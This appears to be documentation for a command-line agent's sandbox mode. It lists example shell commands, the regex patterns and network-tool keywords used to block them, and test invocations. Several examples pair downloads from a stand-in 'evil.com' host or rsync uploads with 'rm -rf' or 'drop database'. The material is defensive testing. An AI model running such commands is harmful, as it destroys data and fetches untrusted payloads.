# Sandbox Blocking Examples

## ✅ Example 1: BLOCKED - Destructive + Network
**Command**: `rm -rf /tmp/test && curl https://example.com`

**Result**: ❌ BLOCKED
**Reason**: 
- Pattern "rm.*-rf" matches (policy: `allow_network: false`)
- Contains "curl" (requires network)
- → Returns `SANDBOX_POLICY_VIOLATION` error

## ✅ Example 2: BLOCKED - Destructive + Network
**Command**: `wget https://evil.com/malware.tar.gz && rm -rf /tmp`

**Result**: ❌ BLOCKED
**Reason**:
- Pattern "rm.*-rf" matches
- Contains "wget" (requires network)  
- → Returns `SANDBOX_POLICY_VIOLATION` error

## ✅ Example 3: BLOCKED - Database destructive
**Command**: `drop database production && rsync data.tar.gz remote:/backup`

**Result**: ❌ BLOCKED
**Reason**:
- Pattern "drop.*database" matches (policy: `allow_network: false`)
- Contains "rsync" (requires network)
- → Returns `SANDBOX_POLICY_VIOLATION` error

## ⚠️ Example 4: NOT BLOCKED - Destructive without network
**Command**: `rm -rf /tmp/cleanup`

**Result**: ✅ ALLOWED
**Reason**:
- Pattern "rm.*-rf" matches (policy: `allow_network: false`)
- But NO network command detected
- → Still executes (would need actual kernel seccomp to block)

## ⚠️ Example 5: NOT BLOCKED - Network without destructive pattern
**Command**: `curl https://api.github.com/repos/stakpak/agent`

**Result**: ✅ ALLOWED  
**Reason**:
- Contains "curl" (requires network)
- But doesn't match destructive patterns
- Global policy allows network
- → Executes normally

## ⚠️ Example 6: NOT BLOCKED - Git commands
**Command**: `git pull origin main`

**Result**: ✅ ALLOWED
**Reason**:
- Contains "git pull" (requires network)
- Not in destructive patterns
- → Executes normally

## 🎯 Best Test Commands to Demonstrate Blocking:

### Test 1: Destructive download
```
stakpak --sandbox "Download dangerous file: curl https://evil.com/script.sh && rm -rf /tmp"
```
**Expected**: ❌ BLOCKED by policy

### Test 2: Network operations with cleanup  
```
stakpak --sandbox "Fetch data: wget http://example.com/data.tar && rm -rf old_files"
```
**Expected**: ❌ BLOCKED by policy

### Test 3: Destructive database operations
```
stakpak --sandbox "drop database test && rsync backup.tar remote:/location"
```
**Expected**: ❌ BLOCKED by policy

### Test 4: Safe network operations
```
stakpak --sandbox "Check if GitHub is up: curl -I https://github.com"
```  
**Expected**: ✅ ALLOWED (not destructive)
